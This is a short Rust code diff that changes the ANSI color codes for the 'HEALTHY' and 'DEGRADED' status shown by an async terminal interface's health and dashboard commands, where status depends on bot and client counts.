@@ -160,7 +160,7 @@ pub async fn handle_health_command(client: &Arc<Client>, state: &Arc<AppState>) 
     let minutes = (uptime.as_secs() % 3600) / 60;
     
     let status = if bot_count > 0 && client_count > 0 { "HEALTHY" } else { "DEGRADED" };
-    let status_color = if status == "HEALTHY" { 82 } else { 196 };
+    let status_color = if status == "HEALTHY" { 51 } else { 39 };
     
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
     
@@ -445,9 +445,9 @@ pub async fn handle_dashboard_command(client: &Arc<Client>, state: &Arc<AppState
     
     // System Status
     let status = if bot_count > 0 && client_count > 0 { 
-        apply_gradient("HEALTHY", 82, 87)
+        apply_gradient("HEALTHY", 51, 87)
     } else {
-        apply_gradient("DEGRADED", 196, 160)
+        apply_gradient("DEGRADED", 39, 45)
     };
     
     client.write(format!("  \x1b[38;5;245mSystem Status   : \x1b[0m{}\n\r", status).as_bytes()).await?;
